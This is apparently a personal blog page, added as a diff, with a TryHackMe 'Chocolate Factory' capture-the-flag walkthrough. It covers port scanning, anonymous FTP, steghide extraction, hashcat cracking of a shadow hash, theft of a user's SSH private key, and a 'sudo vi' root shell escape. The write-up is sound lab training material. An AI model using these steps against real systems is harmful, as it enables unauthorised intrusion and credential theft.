@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <link rel="stylesheet" href="/style.css">
+        <title>christopher di-nozzi</title>
+
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta
+            name="description"
+            content="A page generated using ssg. Probably a blog post.">
+    </head>
+    <div id="header">
+   <h1> <a href="/">christopher di-nozzi</a></h1>
+    <nav>
+        <a href="/about">about</a>
+        <span>|</span>
+        <a href="/projects">projects</a>
+        <span>|</span>
+        <a href="/blog">blog</a>
+    </nav>
+    <hr>
+    </div>
+    <div id="main">
+<h1>TryHackMe Walkthrough - Chocolate Factory</h1>
+
+<h3>Oompa Loompa Doompety Doo! I've got a perfect room for you!</h3>
+
+<p>18/01/2021</p>
+
+<p>Another day, another box! I just hope it's not as weird as the Charlie and the Chocolate Factory movie was...  </p>
+
+<p>Room by <a href="https://tryhackme.com/p/0x9747">0x9747</a> and <a href="https://tryhackme.com/p/saharshtapi">saharshtapi</a> and <a href="https://tryhackme.com/p/AndyInfoSec">AndyInfoSec</a>. Check it out <a href="https://tryhackme.com/room/chocolatefactory">here</a>!</p>
+
+<h2>Enumeration</h2>
+
+<p>We start with an NMAP scan of the system. As always, I threw on a full port scan and service enumeration running:</p>
+
+<p><code>
+nmap -sV -p- IP
+</code></p>
+
+<p>I got a lot of results from doing this, a lot of open services.</p>
+
+<p><code>
+PORT STATE SERVICE VERSION <br />
+21/tcp open ftp vsftpd 3.0.3 <br />
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) <br />
+80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) <br />
+100/tcp open newacct? <br />
+101/tcp open hostname? <br />
+102/tcp open iso-tsap? <br />
+103/tcp open gppitnp? <br />
+104/tcp open acr-nema? <br />
+105/tcp open csnet-ns? <br />
+106/tcp open pop3pw? <br />
+107/tcp open rtelnet? <br />
+108/tcp open snagas? <br />
+109/tcp open pop2? <br />
+110/tcp open pop3? <br />
+111/tcp open rpcbind? <br />
+112/tcp open mcidas? <br />
+113/tcp open ident? <br />
+114/tcp open audionews? <br />
+115/tcp open sftp? <br />
+116/tcp open ansanotify? <br />
+117/tcp open uucp-path? <br />
+118/tcp open sqlserv? <br />
+119/tcp open nntp? <br />
+120/tcp open tcpwrapped <br />
+121/tcp open tcpwrapped <br />
+122/tcp open tcpwrapped <br />
+123/tcp open tcpwrapped <br />
+124/tcp open tcpwrapped <br />
+125/tcp open tcpwrapped
+</code></p>
+
+<p>Let's start simple, with port 80! Visiting the IP in my browser took me to the squirrel room! It's asking for some login credentials which I don't have :( Time for some more enumeration! I ran a dirb scan and a nikto scan on the webserver as well, just in case there was anything we were missing. While that's running, lets check out that FTP port!</p>
+
+<h2>FTP</h2>
+
+<p>I ran this command to open an FTP session:</p>
+
+<p><code>
+ftp IP
+</code></p>
+
+<p>Replace IP with your machines IP. Then I used username anonymous and password anonymous to get access! The oldest FTP trick in the book! When I got in, I looked for files by running "ls" and there was "gum_room.jpg". I ran:</p>
+
+<p><code>
+get gum\_room.jpg
+</code></p>
+
+<p>This downloaded the file onto my machine. It looks like a pretty normal file, but maybe its hiding something? We can use steghide to check! I ran the command:</p>
+
+<p><code>
+steghide extract -sf gum\_room.jpg
+</code></p>
+
+<p>Would you look at that! A file was hidden inside called "b64.txt". If we look at the contents of it, it looks like base 64. I put it into <a href="https://gchq.github.io/CyberChef/">CyberChef</a> to decode it from base 64. It looks like the contents of a /etc/shadow file and has the password hash for the user charlie! Lets crack it!</p>
+
+<h2>Cracking Charlies Hash / Answer 2</h2>
+
+<p>I moved the hash into its own file called "charlie.hash". I then used hashcat and the rockyou.txt wordlist to try and crack it.</p>
+
+<p><code>
+hashcat -a 0 -m 1800 charlie.hash /usr/share/wordlists/rockyou.txt
+</code></p>
+
+<p>After a little bit of time I got out password! I tried this for SSH login but it didn't work... maybe on the website? And we're in! I could successfully login to the website using the username "charlie" and the password we just cracked!</p>
+
+<h2>Website / Answer 1</h2>
+
+<p>We seem to be able to execute commands on the server via the input box. We can look at the files in our directory by running "ls". There was one that stood out: key_rev_key. Running "cat key_rev_key" shows us that it's some sort of compiled executable! By looking at the page source we can see it more clearly! We can look at the stings in the executable by running:</p>
+
+<p><code>
+strings key\_rev\_key
+</code></p>
+
+<p>Theres a big giveaway with "congratulations you have found the key:". Right after there is our key and the answer to question 1! Maybe this will come in handy later...</p>
+
+<h2>Charlie Access / Answer 4</h2>
+
+<p>Let's see if we can get access to the Charlie user! We can look at his files by running:</p>
+
+<p><code>
+ls /home/charlie
+</code></p>
+
+<p>There's the user flag! But we don't have permission to open it! There's two other files: teleport and teleport.pub. Could be a set of SSH keys? We can take a look at one of them by running:</p>
+
+<p><code>
+cat /home/charlie/teleport
+</code></p>
+
+<p>Looks like an SSH private key to me! Lets copy that onto our system! I saved it as "teleport" to keep things simple. We need to make sure we set the permissions correctly on this key otherwise the server won't like it. Run this command:</p>
+
+<p><code>
+chmod 700 teleport
+</code></p>
+
+<p>This way only the owner (which is us!) can access it and the server will stay happy! Now we just run:</p>
+
+<p><code>
+ssh -i teleport charlie@IP
+</code></p>
+
+<p>We're in! :D Now we can get that user flag by navigating home and opening it up!</p>
+
+<p><code>
+cd /home/charlie cat user.txt
+</code></p>
+
+<p>One flag down... one to go...</p>
+
+<h2>Root / Answer 5</h2>
+
+<p>Let's check what programs we can run as sudo by running:</p>
+
+<p><code>
+sudo -l
+</code></p>
+
+<p>It looks like we can run "vi" as sudo! Perfect! I looked up vi in <a href="https://gtfobins.github.io/">GTFOBins</a> and found a nice way to get us root access! We just have to run:</p>
+
+<p><code>
+sudo vi -c ':!/bin/sh' /dev/null
+</code></p>
+
+<p>We're in! We can change directory into root and see if that flags there!</p>
+
+<p><code>
+cd /root <br />
+ls
+</code></p>
+
+<p>No flag :( But there is "root.py"! Let's open it up!</p>
+
+<p>```
+cat root.py  </p>
+
+<p>from cryptography.fernet import Fernet <br />
+import pyfiglet <br />
+key=input("Enter the key: ") <br />
+f=Fernet(key) <br />
+encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ' <br />
+dcrypt_mess=f.decrypt(encrypted_mess) <br />
+mess=dcrypt_mess.decode() <br />
+display1=pyfiglet.figlet_format("You Are Now The Owner Of ") <br />
+display2=pyfiglet.figlet_format("Chocolate Factory ") <br />
+print(display1) <br />
+print(display2) <br />
+print(mess) <br />
+```</p>
+
+<p>Looks like we have an encrpyted string and need a key to crack it! When trying to run the python script I ran into some issues so lets use <a href="https://asecuritysite.com/encryption/ferdecode">this website</a> instead. We can put the contents of the "encrypted_mess" variable into the "token" field, now we just need a key! Let's try our key from answer 1! Make sure to only include the section from "-" to "="! There's our key! Done!</p>
+
+<h2>Conclusion</h2>
+
+<p>I had a lot of fun doing this room! I was a bit confused by the ordering of the questions, finding the answer to question 2 before question 1 but other than that it was quite straight forward! It's a bit harder than some of the other "easy" boxes on TryHackMe but not too complicated!</p>
+</div>
+    <hr>
+    <footer>
+        <nav>
+            <a href="https://twitter.com/chris_dinozzi">twitter</a>
+            <span>|</span>
+            <a href="https://unsplash.com/@chrisdinozzi">photos</a>
+            <span>|</span>
+            <a href="https://github.com/chrisdinozzi">github</a>
+        </nav>
+    </footer>
+</html>
